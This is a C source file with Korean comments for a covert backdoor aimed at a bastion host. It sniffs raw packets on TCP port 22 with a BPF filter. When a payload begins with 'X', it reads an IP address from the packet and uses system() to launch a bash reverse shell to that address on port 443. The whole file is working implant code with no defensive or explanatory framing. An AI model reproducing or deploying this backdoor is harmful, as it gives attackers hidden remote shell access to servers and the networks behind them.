#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>  // TCP 헤더를 위해 추가
#include <net/ethernet.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/filter.h>

void apply_bpf_filter(int sd);
bool extract_trigger_host(const char *data, size_t data_len, char *host, size_t host_size);
void log_trigger_event(const struct iphdr *ip_pkt, const char *host, size_t payload_len);

int main(void) {
    int sd;
    int pkt_size;
    char *buf;

    buf = malloc(65536);
    if (buf == NULL) {
        perror("error allocating packet buffer");
        exit(1);
    }

    // 모든 패킷을 캡처하는 로우 소켓 생성
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("error creating socket");
        free(buf);
        exit(1);
    }

    // 사용자가 추출한 TCP 22번 전용 BPF 필터 적용
    apply_bpf_filter(sd);
    printf("Listening for TCP/22 (SSH) trigger packets on Bastion Host...\n");

    while (1) {
        struct iphdr *ip_pkt;
        struct tcphdr *tcp_pkt;
        size_t ip_header_len;
        size_t tcp_header_len;
        size_t data_offset;
        char *data;
        size_t data_len;
        char host[16];

        if ((pkt_size = recvfrom(sd, buf, 65536, 0, NULL, NULL)) < 0) {
            perror("error receiving from socket");
            close(sd);
            free(buf);
            exit(1);
        }

        // 최소 길이 체크 (Ethernet + IP + TCP)
        if ((size_t)pkt_size < sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
            continue;
        }

        // IP 헤더 위치 파악 및 길이 계산
        ip_pkt = (struct iphdr *)(buf + sizeof(struct ether_header));
        ip_header_len = ip_pkt->ihl * 4;

        // TCP 헤더 위치 파악 및 길이 계산 (데이터가 시작되는 오프셋)
        tcp_pkt = (struct tcphdr *)(buf + sizeof(struct ether_header) + ip_header_len);
        tcp_header_len = tcp_pkt->doff * 4;

        // 실제 페이로드(데이터) 위치 계산
        data_offset = sizeof(struct ether_header) + ip_header_len + tcp_header_len;
        data = buf + data_offset;

        // 데이터가 버퍼 범위를 넘지 않는지 확인
        if (data_offset >= (size_t)pkt_size) {
            continue;
        }

        data_len = (size_t)pkt_size - data_offset;

        // 트리거 신호 'X' 확인
        if (data_len == 0 || data[0] != 'X') {
            continue;
        }

        // 페이로드에서 호스트 IP 추출
        if (!extract_trigger_host(data, data_len, host, sizeof(host))) {
            continue;
        }

        log_trigger_event(ip_pkt, host, data_len);
    }

    close(sd);
    free(buf);
    return 0;
}

void apply_bpf_filter(int sd) {
    // 사용자가 배스천 호스트에서 직접 추출한 TCP dst port 22 바이트코드
    struct sock_filter filter[] = {
        { 0x28, 0, 0, 0x0000000c },
        { 0x15, 0, 4, 0x000086dd },
        { 0x30, 0, 0, 0x00000014 },
        { 0x15, 0, 11, 0x00000006 },
        { 0x28, 0, 0, 0x00000038 },
        { 0x15, 8, 9, 0x00000016 },
        { 0x15, 0, 8, 0x00000800 },
        { 0x30, 0, 0, 0x00000017 },
        { 0x15, 0, 6, 0x00000006 },
        { 0x28, 0, 0, 0x00000014 },
        { 0x45, 4, 0, 0x00001fff },
        { 0xb1, 0, 0, 0x0000000e },
        { 0x48, 0, 0, 0x00000010 },
        { 0x15, 0, 1, 0x00000016 },
        { 0x6, 0, 0, 0x00040000 },
        { 0x6, 0, 0, 0x00000000 },
    };

    struct sock_fprog bpf = {
        .len = sizeof(filter) / sizeof(struct sock_filter),
        .filter = filter,
    };

    if ((setsockopt(sd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf))) < 0) {
        perror("error attaching BPF filter");
        exit(1);
    }
}

bool extract_trigger_host(const char *data, size_t data_len, char *host, size_t host_size) {
    size_t i;
    if (data_len < 2 || host_size < 2 || data[0] != 'X') return false;


    for (i = 1; i < data_len && (i - 1) < host_size - 1; i++) {
        if (data[i] == ':' || data[i] == '\0' || data[i] == ' ' || data[i] == '\n') break;
        host[i - 1] = data[i];
    }
    if (i == 1) return false;
    host[i - 1] = '\0';
    return true;
}

void log_trigger_event(const struct iphdr *ip_pkt, const char *host, size_t payload_len) {
    char command[256];

    printf("\n[!] Trigger Matched! Executing Reverse Shell to %s:443\n", host);

    // /bin/bash 전체 경로 사용 및 표준 에러까지 리다이렉션
    sprintf(command, "/bin/bash -c '/bin/bash -i >& /dev/tcp/%s/443 0>&1' &", host);

    system(command);
}

